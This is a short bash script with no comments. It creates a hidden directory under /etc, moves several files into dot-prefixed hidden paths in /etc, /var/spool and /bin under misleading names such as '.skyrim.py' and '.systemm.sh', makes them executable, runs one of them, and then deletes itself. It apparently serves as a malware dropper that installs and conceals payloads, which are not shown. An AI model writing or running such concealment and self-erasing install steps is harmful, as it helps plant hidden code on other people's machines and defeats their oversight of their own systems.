#!/bin/bash
mkdir /etc/.music
mv /etc/.a/skyrim.py /etc/.music/.skyrim.py
chmod +x /etc/.music/.skyrim.py
mv /etc/.a/log.sh /var/spool/.log.sh
chmod +x /var/spool/.log.sh
mv /etc/.a/systemm.sh /bin/.systemm.sh
chmod +x /bin/.systemm.sh
mv /etc/.a/resolver.sh /etc/.resolver.sh
chmod +x /etc/.resolver.sh
bash /etc/.resolver.sh
rm -- "$0"
